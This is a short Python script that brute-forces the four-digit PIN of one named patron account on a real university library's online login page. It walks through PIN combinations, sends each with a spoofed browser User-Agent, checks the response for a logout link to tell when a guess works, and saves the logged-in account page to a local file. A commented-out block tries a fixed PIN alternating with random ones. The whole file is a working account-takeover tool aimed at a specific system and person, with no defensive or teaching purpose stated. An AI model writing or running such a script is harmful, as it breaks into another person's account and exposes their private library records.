
from random import random
import random
from time import sleep
import requests

url = 'https://innopac.lib.fcu.edu.tw/patroninfo~S9*cht/1178687/top'
payloads = {
    'code': 'd0948511',
    'pin': '5',
    'submit': '登入'
}
seesion = requests.session()
flag = 0
list = [[0]*100, [0]*100]


def loop():
    for i in range(9, 0, -1):
        for j in range(2, 0, -1):
            for k in range(9, 0, -1):
                for l in range(9, 0, -1):
                    sleep(1.5)
                    payloads['pin'] = str(i)+str(j)+str(k)+str(l)
                    print(f'{payloads}')
                    header = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
                    }
                    # p = requests.post(url, data=payloads,headers=header)
                    seesion.post(url, headers=header, data=payloads)
                    response = seesion.get(
                        'https://innopac.lib.fcu.edu.tw/patroninfo~S9*cht/1178687/top', headers=header)
                    # print(response.text)
                    if '登出' in response.text:
                        flag = 1
                        print('成功登入')
                        print(f'{payloads}')
                        return

    # print the html returned or something more intelligent to see if it's a successful login page.


loop()
header = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
}
cnt = 0      # An authorised request.
'''while 1:
    cnt+=1
    sleep(1)
    if cnt%2==0:
        payloads['pin']=str(9198)
    else:
        n=random.randint(1,10)
        payloads['pin']=str(n)
    print(payloads)
    seesion.post(url, headers = header, data = payloads)'''
response = seesion.get(
    'https://innopac.lib.fcu.edu.tw/patroninfo~S9*cht/1178687/top', headers=header)
if '登出' in response.text:
    print('成功登入')
with open("renren3.html", "w", encoding="utf-8") as f:
    f.write(response.content.decode())
print(f'cnt is {cnt}')
# blk-pat-info
#
